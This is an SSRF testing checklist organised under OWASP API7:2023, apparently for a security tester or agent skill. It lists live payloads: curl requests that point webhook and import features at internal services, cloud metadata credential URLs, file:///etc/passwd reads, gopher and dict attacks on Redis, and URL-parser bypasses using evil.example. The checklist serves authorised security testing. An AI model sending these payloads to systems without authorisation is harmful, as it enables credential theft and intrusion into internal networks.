# API7:2023 — Server Side Request Forgery

> Skill: `ssrf-testing`

## Webhook URL SSRF
- [ ] Test webhook registration with internal URLs: `curl -X POST -d '{"url":"http://127.0.0.1:8080/admin"}' https://api/webhooks`
- [ ] Test with cloud metadata endpoints: `http://169.254.169.254/latest/meta-data/`
- [ ] Test webhook with DNS rebinding: register legitimate domain that resolves to internal IP
- [ ] Check if webhook delivery responses are returned to the user (full SSRF vs blind)

## PDF Generator SSRF
- [ ] Test HTML-to-PDF endpoints with internal URL references: `<img src="http://127.0.0.1/">`
- [ ] Test with `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">`
- [ ] Test with `<link>` and `<script>` tags pointing to internal resources
- [ ] Test with CSS `url()` references: `body { background: url(http://internal:8080/secret) }`

## URL Import / Fetch Features
- [ ] Test "import from URL" features: `curl -X POST -d '{"url":"http://127.0.0.1:6379/"}' https://api/import`
- [ ] Test file-from-URL upload: endpoints that fetch and store remote files
- [ ] Test avatar/image URL fields: `{"avatar_url": "http://169.254.169.254/"}`
- [ ] Test RSS/feed parser endpoints with internal URLs

## OAuth redirect_uri SSRF
- [ ] Test `redirect_uri` with internal URLs in OAuth flows
- [ ] Test with `redirect_uri=http://127.0.0.1/callback` during authorization

## Image Proxy & URL Preview
- [ ] Test image proxy endpoints: `https://api/proxy?url=http://127.0.0.1/`
- [ ] Test link preview/unfurl features (Slack-style): submit internal URLs for preview
- [ ] Test OpenGraph/metadata fetchers with internal targets

## URL Parser Bypass Techniques
- [ ] Test URL parser inconsistencies: `http://127.0.0.1@evil.example`, `http://evil.example#@127.0.0.1`
- [ ] Test with alternative IP representations: `http://0x7f000001/`, `http://2130706433/`, `http://017700000001/`
- [ ] Test IPv6 bypass: `http://[::1]/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/`
- [ ] Test with URL-encoded characters: `http://127.0.0.%31/`
- [ ] Test with redirect chains: point to external URL that 302-redirects to internal
- [ ] Test DNS rebinding: domain that alternates between external and internal IP

## Protocol-Specific SSRF
- [ ] Test `file://` protocol: `file:///etc/passwd`
- [ ] Test `gopher://` for multi-protocol attacks (Redis, SMTP, etc.)
- [ ] Test `dict://` for service enumeration: `dict://127.0.0.1:6379/info`

---
> Cross-reference: A05 checklist, `ssrf-testing` skill
